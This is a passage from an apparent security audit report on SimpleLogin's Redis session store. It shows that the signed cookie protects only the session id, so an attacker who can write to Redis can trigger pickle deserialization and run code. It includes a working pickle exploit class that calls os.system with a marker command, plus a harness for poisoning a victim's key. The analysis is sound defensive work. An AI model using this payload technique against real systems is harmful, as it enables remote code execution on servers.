**Short answer: No — being unable to forge the signed id does not meaningfully reduce the risk.** The HMAC signature protects only the session-id *pointer* (which Redis key `open_session` reads), not the integrity of the unsigned pickle *payload* that pointer resolves to. An attacker with Redis **write** access therefore reaches `pickle.loads` with attacker-controlled bytes using the victim's *own* valid, unforged cookie. The evidence below was produced by Script B (§3) and is the actual, unedited runtime output.

### 7.1 The two artifacts and their integrity properties (observed + cited)

| Artifact | Where produced | Signed / integrity-protected? | Citation |
|----------|----------------|-------------------------------|----------|
| Session-id string (the `slapp` cookie's `<sid>` half) | `save_session` signs it with `self._get_signer(app).sign(...)` | **YES** — `itsdangerous` HMAC-SHA1, `salt="session"`, keyed by `app.secret_key` | `app/session.py:37-41`, `app/session.py:102-114` |
| Pickle payload (the Redis value under `session:<sid>`) | `save_session` writes `pickle.dumps(dict(session))` | **NO** — stored raw and unsigned via `setex` | `app/session.py:91`, `app/session.py:97-101` |

The signer covers the **sid only** (proven byte-for-byte in §2.1: `signer.validate(cookie)=True` and `signer.sign(sid)` reproduces the emitted cookie exactly). Nothing in `open_session` verifies, signs, or authenticates the Redis value before handing it to `pickle.loads` at `app/session.py:76` — the `if val is not None:` guard at `app/session.py:74` is the *only* check, and it tests presence, not integrity.

### 7.2 Signature-independence proof (Evidence 4.7 — verbatim)

Script B logs a victim in, captures the victim's genuine cookie, verifies the signature, then overwrites the victim's Redis payload with the weaponized pickle from §6 and re-checks the signature — **without ever touching the cookie**:

```text
victim cookie = cd6ab591-f8e8-420e-9a66-0d88b8bd207e.3or8ZsYRydHG4FGHqdw7oZ3qUX8
signer.sign(want_bytes(sid)) == emitted cookie ?  True (signs ONLY the sid string, salt='session')
signer.validate(cookie) BEFORE payload tamper = True
signer.validate(cookie) AFTER payload tamper  = True (UNCHANGED => signature independent of payload)
marker BEFORE victim's next request = False
victim's next request (OWN valid unforged cookie) -> status 302 ; marker AFTER = True => legit signed sid POINTED open_session at attacker's unsigned payload -> pickle.loads -> RCE
```

**Interpretation (with citations):**

- **The signature is a function of the sid string alone.** `signer.sign(want_bytes(sid))` reproduces the emitted cookie exactly, and `salt="session"` confirms the signer domain (`app/session.py:37-41`). The signature is computed and verified over the session id, never over the Redis payload.
- **Tampering the payload does not invalidate the cookie.** `signer.validate(cookie)` returns `True` **both before and after** the Redis value is overwritten — the two results are identical (`UNCHANGED`). This is the crux: the integrity check that *does* exist (`extract_and_validate_session_id`, `app/session.py:47-59`) is structurally blind to the payload it points at.
- **The victim's own unforged cookie drives the exploit.** On the victim's next real `GET /dashboard/`, the browser presents the *legitimate* signed cookie. `extract_and_validate_session_id` accepts it (signature valid), `open_session` builds the key `session:<sid>` (`app/session.py:43-45`), `self._redis_r.get(...)` returns the attacker's poisoned bytes (`app/session.py:73`), and `pickle.loads(val)` (`app/session.py:76`) executes the attacker's `__reduce__` callable — the marker is created. The attacker never forged, guessed, or stole the cookie.

**Conclusion for (e):** the signed id is *only a pointer*; the dangerous operation is performed on the *unsigned bytes it points to*. An attacker who can write to Redis but cannot forge the `slapp` cookie is therefore **not meaningfully constrained** — the victim (or any authenticated user whose key the attacker overwrote) supplies the valid pointer for free on their very next request. The inability to forge the id blocks *session hijacking by cookie forgery*, but it does **not** block *deserialization RCE via payload poisoning*, because those are two different attack surfaces protected by two different (and here, only one) integrity mechanisms.

### 7.3 Contingency and scope of the threat (observed boundary conditions)

The exploit is **contingent on Redis write access** and is *not* reachable by a normal web client:

- A normal client can only present a signed cookie. Tampering the signature is rejected at `extract_and_validate_session_id` → `None` (Evidence 4.4, condition 3b: `signer.unsign(tampered)` raises `BadSignature`, `pickle.loads` invoked **0×**). So a browser-only attacker cannot even reach the deserializer with chosen bytes.
- The RCE path opens only when the attacker can **write the Redis value** under an existing (or attacker-created) `session:<sid>` key. This mirrors an exposed/compromised Redis instance, an SSRF-to-Redis primitive, a shared multi-tenant cache, or a network-adjacent attacker on an unauthenticated Redis port.

This contingency is stated honestly as a *precondition*, not a mitigation: given Redis write access, the signature provides no defense for the payload.

### 7.4 Classification and real-world precedent

This is a textbook instance of **CWE-502 (Deserialization of Untrusted Data)**, mapping to **OWASP Top 10 2021 category A08:2021 — Software and Data Integrity Failures**. The root property is well-documented in the Python standard library: the `pickle` module is explicitly not secure against maliciously constructed data and can execute arbitrary code during unpickling — which is precisely why unpickling untrusted input constitutes CWE-502.

A close, recent real-world analogue is the **python-socketio** advisory **GHSA-g8c6-8fjj-2r4m** (**CVE-2025-61765**, published October 2025). <cite index="3-4,3-6">When Socket.IO servers use a message-queue backend such as Redis for inter-server communication, messages are encoded with the pickle module, and the vulnerability stems from deserialization of those messages using Python's pickle.loads() function.</cite> <cite index="3-7">Having previously obtained access to the message queue, the attacker can send a crafted pickle payload that executes arbitrary code during deserialization via Python's __reduce__ method.</cite> Critically, the exposure is gated on backing-store access: <cite index="8-1">single-server systems that do not use a message queue, and multi-server systems with a secure message queue, are not vulnerable.</cite> The upstream fix removed pickle entirely: <cite index="8-2">version 5.14.0 or newer removes the pickle module and uses the much safer JSON encoding for inter-server messaging.</cite>

The parallel to SimpleLogin's `RedisSessionStore` is exact: the dangerous `pickle.loads` (`app/session.py:76`) runs against bytes fetched from a Redis backing store, and the exploit is reachable **only** when an attacker can write to that store — differing from the socketio case only in that the poisoned bytes arrive via a server-side *session* value rather than an inter-server *message*. *(This paragraph is background context for classification only; per the read-only scope it is explicitly not a remediation proposal.)*

### 7.5 API logout — verified by code reference (NOT runtime-exercised)

The API logout route is covered here by **code reference**, since it was not exercised at runtime. The route `GET /api/logout` (`app/api/views/user_info.py:131`) invokes the **same** `logout_session()` (`app/api/views/user_info.py:140`) demonstrated for web logout in §2.2, then deletes the session cookie (`app/api/views/user_info.py:142`); the route is guarded by `@require_api_auth`. Because it calls the identical teardown function (`logout_session()` → `logout_user()` + `purge_session()`, `app/session.py:117-121`), its session-destruction mechanism is the same as the runtime-exercised web logout. This item is labeled **verified-by-code-reference (same mechanism as web logout)**, *not* runtime-observed, and appears as such in the observed-vs-inferred ledger (§9).


---

## 8. Coverage pass — every sub-question mapped to its answer and evidence

The original question decomposes into five named parts. Each is answered explicitly, next to actual runtime output, as follows:

| # | Sub-question | Answer (one line) | Section | Evidence block | Status |
|---|--------------|-------------------|---------|----------------|--------|
| — | **How is session data deserialized?** | A single `pickle.loads(val)` in `open_session` at `app/session.py:76`; serializer is stdlib `pickle` (protocol 4, `\x80\x04`) after the Py3 `cPickle` `ImportError` fallback at `app/session.py:9-12`. | §2, §3 | 4.0, 4.1, 4.3 | ✅ answered |
| (a) | **Baseline login/logout lifecycle** | Login writes `pickle.dumps(dict(session))` to `session:<sid>` via `setex` (7-day TTL) and sets a signed `slapp` cookie; logout deletes the key + 3 cookies and re-sets a fresh anonymous cookie. | §2 | 4.0, 4.1, 4.2 | ✅ answered |
| (b) | **Corrupted/malformed payload behavior on the next request (fail? silent reset? surfaced error?)** | **Silent reset.** `pickle.loads` raises, `except Exception: pass` (`app/session.py:78-79`) swallows it, a fresh `ServerSession(uuid4)` is returned (`:80`). Response is a normal `302` to `/auth/login` — **no failure, no surfaced error, no 500**. | §3 | 4.3 | ✅ answered |
| (c) | **What appears in the HTTP response and server logs** | Response: normal `302` redirect (no error page). Logs: exactly **one** generic `after_request()` line (`server.py:284`), differing from a normal request only by status (`302` vs `200`); **no** pickle/session/reset-specific log, because `app/session.py` imports no logger (`app/session.py:1-16`). The reset is indistinguishable from "user was never logged in." | §4 | 4.5 | ✅ answered |
| (d) | **Boundary between a harmless reset and a genuine deserialization risk** | Identical code path through `pickle.loads` at `app/session.py:76`. Invalid/benign bytes raise → harmless silent reset. A **valid, weaponized** pickle (`__reduce__` → `STACK_GLOBAL`+`REDUCE`) executes `os.system` *inside* `loads` **before** the `except` at `:78` — RCE. Sole discriminator: is the attacker's byte-string a valid weaponized pickle program? | §6 | 4.6 | ✅ answered |
| (e) | **Threat model: attacker can tamper stored bytes but cannot forge the signed id** | Risk is **not** meaningfully reduced. HMAC signs only the sid *pointer* (`app/session.py:37-41`); the payload is stored raw/unsigned (`app/session.py:91`). Payload tampering leaves `signer.validate(cookie)=True` unchanged; the victim's *own* unforged cookie points `open_session` at poisoned bytes → RCE. CWE-502 / OWASP A08:2021; analogous to GHSA-g8c6-8fjj-2r4m. | §7 | 4.7, 4.8 | ✅ answered |

Supplementary edge/error conditions the question implies (all exercised): missing/empty Redis value — `pickle.loads` never reached (`app/session.py:74` guard), §5 / Evidence 4.4(3a); `BadSignature` cookie — rejected pre-Redis (`app/session.py:47-59`), §5 / Evidence 4.4(3b); truncated pickle — `UnpicklingError: pickle data was truncated`, caught, §5 / Evidence 4.4(3c).

---

## 9. Observed-vs-inferred ledger & reproducibility

Per the SWE-AtlasQnA-Repo methodology, every claim is classified below as **observed** (produced at runtime and shown verbatim in §2–§7), **captured** (a byte-sensitive value verified against the exact emitted bytes), or **inferred / code-reference** (not directly runtime-exercised).

| Claim | Classification | Basis |
|-------|----------------|-------|
| Deserializer is stdlib `pickle.loads` at `app/session.py:76` | **Observed** | Counting wrapper recorded `pickle.loads invoked = 1×` on corrupted/truncated paths (Evidence 4.3, 4.4) |
| Pickle protocol = 4 (`\x80\x04` PROTO opcode) | **Captured** | `pickle.DEFAULT_PROTOCOL = 4` printed (4.0); every emitted payload begins `\x80\x04`; confirmed by `pickletools.dis` (4.1, 4.6) |
| `slapp` cookie signature covers the sid only | **Captured** | `signer.validate(cookie)=True` and `signer.sign(sid)` reproduces the emitted cookie byte-for-byte (4.1); unchanged after payload tamper (4.7) |
| Corrupted payload → silent reset (new sid, 302, no error) | **Observed** | sid change + `302` + swallowed `UnpicklingError` captured (4.3) |
| Reset emits no session/pickle-specific log line | **Observed** | `grep` proof of no logger import + fd-level A/B log capture (4.5) |
| Missing value → `pickle.loads` never called | **Observed** | `pickle.loads invoked = 0×` (4.4, 3a) |
| `BadSignature` cookie → rejected before Redis/pickle | **Observed** | `extract_and_validate_session_id(tampered)=None`, `invoked = 0×` (4.4, 3b) |
| Valid weaponized pickle → RCE inside `pickle.loads` | **Observed** | marker file created in isolation *and* through the real `open_session` path (4.6) |
| Payload tampering does not change cookie validity | **Observed** | `signer.validate` identical before/after tamper (4.7) |
| Authenticated TTL = 604800 s (7 days); anonymous = 300 s | **Observed** | `setex` TTL captured (4.1); `app/session.py:92,95-96` |
| `permanent_session_lifetime = 31 days` at module rest | **Observed (at-rest)** | Printed at import (4.0); overridden per-request to 7 days by `make_session_permanent` (`server.py:204-207`) |
| Legitimate payload keys `{_permanent,_fresh,_user_id,_id,sudo_time}` | **Observed** | `pickle.loads(raw)` dict + `pickletools.dis` (4.1); no `csrf_token` because harness sets `WTF_CSRF_ENABLED=False` |
| API logout (`GET /api/logout`) destroys the session identically | **Inferred / code-reference** | Not runtime-exercised; calls the same `logout_session()` (`app/api/views/user_info.py:131,140,142`) — §7.5 |
| CWE-502 / OWASP A08:2021 classification & GHSA-g8c6-8fjj-2r4m analogy | **Background (external sources)** | Python `pickle` docs, OWASP, and the python-socketio advisory (CVE-2025-61765) — §7.4 |

**Reproducibility.** Behavior was stable across roughly a dozen logins spanning multiple runs during this investigation. Per-run values differ (session ids are fresh `uuid4`s, signatures/`sudo_time`/user-emails vary), but the *structure* and *behavior* are invariant: cookie shape `<sid>.<sig>`, protocol-4 payload starting `\x80\x04`, silent reset on corruption, no reset-specific log, and RCE on a valid weaponized pickle. The flask-login "strong" session fingerprint `_id` (`002d648872…0c0916`) is deterministic for a fixed request environment and reproduced identically. The evidence blocks embedded verbatim in §2–§7 are the authoritative canonical-runtime captures (Python 3.10.18, canonical `/app` checkout); a re-run under the destination working tree reproduced every block's structure and byte-level properties.

---

## Appendix A — Essential structure of the two observation scripts

The scripts below are the temporary exercisers that produced the evidence in §2–§7. They lived **outside** the repository (under `/tmp`) and were removed afterward (Appendix B). They are reproduced here in essential form so a reader can regenerate the evidence; they mirror the canonical `tests/conftest.py` harness exactly (`CONFIG=tests/test.env`, `create_app()`, `TESTING=True`, `WTF_CSRF_ENABLED=False`, `SERVER_NAME="sl.test"`, `pg_trgm` + `add_sl_domains()` + `add_proton_partner()`, a `create_new_user(...)` with password `"password"`, all wrapped in `connection.begin()` and rolled back at teardown). Redis handles are `app.session_interface._redis_r` / `._redis_w`; login/logout use the exact template from `tests/auth/test_login.py` and `tests/utils.py::login()`.

### A.1 Shared harness bootstrap (both scripts)

```python
import os
os.environ["CONFIG"] = os.path.abspath("tests/test.env")   # enables MEM_STORE_URI -> RedisSessionStore
os.environ.setdefault("GITHUB_ACTIONS_TEST", "true")

from server import create_app
from app.db import Session
from app.models import User
from init_app import add_sl_domains, add_proton_partner
from flask import url_for

app = create_app()
app.config["TESTING"] = True
app.config["WTF_CSRF_ENABLED"] = False
app.config["SERVER_NAME"] = "sl.test"

# per-test DB isolation identical to tests/conftest.py
with app.app_context():
    conn = Session.connection()
    conn.execute("CREATE EXTENSION IF NOT EXISTS pg_trgm")
    add_sl_domains()
    add_proton_partner()

sess = app.session_interface           # app.session.RedisSessionStore
r_read, r_write = sess._redis_r, sess._redis_w

def new_user(email):
    u = User.create(email=email, password="password", name="x", activated=True)
    Session.commit()
    return u

def login(client, email):
    return client.post(url_for("auth.login"),
                       data={"email": email, "password": "password"},
                       follow_redirects=True)
```

### A.2 Script A — baseline + corrupted + edge paths (`/tmp/obs_consolidated.py`)

```python
import pickle as _pkl
import app.session as sessmod

# pass-through counter around the REAL stdlib pickle.loads (behavior identical)
_calls = {"n": 0, "last_exc": None}
_orig_loads = sessmod.pickle.loads
def _counting_loads(b, *a, **k):
    _calls["n"] += 1
    try:
        return _orig_loads(b, *a, **k)
    except Exception as e:
        _calls["last_exc"] = repr(e)
        raise
sessmod.pickle.loads = _counting_loads     # wrapper only; delegates to stdlib

with app.test_client() as client:
    u = new_user("baseline@example.com")
    # 4.0 env/activation dump: session_interface, SESSION_COOKIE_NAME, secret_key,
    #     MEM_STORE_URI, permanent_session_lifetime, pickle.DEFAULT_PROTOCOL, signer.*
    # 4.1 BASELINE login: POST auth.login -> capture slapp cookie, signer.unsign/validate/sign,
    #     redis GET session:<sid> raw bytes repr, pickletools.dis, setex TTL, pickle.loads(raw)
    # 4.2 BASELINE logout: GET auth.logout -> capture the 4 Set-Cookie headers, old-key GET==None
    # 4.3 CORRUPTED: login; r_write.set(key, b"\x00this is definitely not a valid pickle stream\xff\xfe");
    #     GET /dashboard/ -> observe 302, _calls["n"], swallowed UnpicklingError, sid change
    # 4.4 EDGES: (3a) delete key -> loads 0x; (3b) tamper signature -> extract...==None, loads 0x;
    #     (3c) truncate valid payload to 15 bytes -> UnpicklingError: pickle data was truncated, caught
```

### A.3 Script B — observability + boundary + threat model (`/tmp/obs_partb.py`)

```python
import os, pickle

# 4.5 OBSERVABILITY: grep proof (no logger in app/session.py) + OS fd-level capture.
#     The SL logger writes to the process's ORIGINAL stdout fd, so os.dup2 redirection
#     of fd 1 to a temp file is required to honestly capture one NORMAL vs one RESET request.
def capture_fd(fn, path="/tmp/_cap.txt"):
    import sys
    saved = os.dup(1)
    f = open(path, "w"); os.dup2(f.fileno(), 1)
    try:
        fn()
    finally:
        sys.stdout.flush(); os.dup2(saved, 1); os.close(saved); f.close()
    return open(path).read()

# 4.6 BOUNDARY: a well-formed malicious pickle whose ONLY effect is a benign marker file.
class Exploit:
    def __reduce__(self):
        return (os.system,
                ("echo 'ARBITRARY-CODE-EXECUTED-INSIDE-pickle.loads' > /tmp/pickle_rce_marker",))
MAL = pickle.dumps(Exploit(), protocol=4)     # begins \x80\x04 like a real payload
#   (1) isolation: pickle.loads(MAL) -> marker created
#   (2) real path: login; r_write.set(session:<sid>, MAL); GET /dashboard/ -> marker created (RCE)
#   (3) benign contrast: r_write.set(key, b"\x00not a pickle\xff\xfe"); GET -> marker NOT created

# 4.7 THREAT MODEL: login victim; capture cookie; signer.validate BEFORE tamper;
#     r_write.set(victim key, MAL); signer.validate AFTER tamper (UNCHANGED == True);
#     victim's next request with its OWN unforged cookie -> marker created (RCE via valid pointer).

# cleanup marker in a finally: os.path.exists('/tmp/pickle_rce_marker') and os.remove(...)
```

> **Safety note.** The malicious pickle's sole side effect is writing the benign marker file `/tmp/pickle_rce_marker`; no destructive command was executed, and the marker was removed after each run (Appendix B). The demonstrated RCE is contingent on Redis **write** access.

---

## Appendix B — Cleanup and read-only-scope confirmation

Per the read-only scope, all temporary artifacts were removed and the repository was left unchanged except for this one document.

```bash
# remove temporary observation scripts and their outputs (host + container), OUTSIDE the repo
rm -f /tmp/obs_consolidated.py /tmp/obs_a2.py /tmp/obs_partb.py \
      /tmp/obs_a.out /tmp/obs_a.err /tmp/obs_b.out /tmp/obs_b.err \
      /tmp/_cap.txt /tmp/pickle_rce_marker

# confirm the git working tree is clean except for the single new document
git -C /tmp/blitzy/app/<repo> status --porcelain
# expected: exactly one line ->  ?? blitzy/documentation/app_2cd6ee777f8c.md
```

**Read-only discipline confirmed:** no existing source file was modified, created, or deleted; no dependency was added, updated, or removed; the only artifact added to the repository is `blitzy/documentation/app_2cd6ee777f8c.md`. The HEAD commit under investigation is `2cd6ee777f8c2d3531559588bcfb18627ffb5d2c`, unchanged by this work.

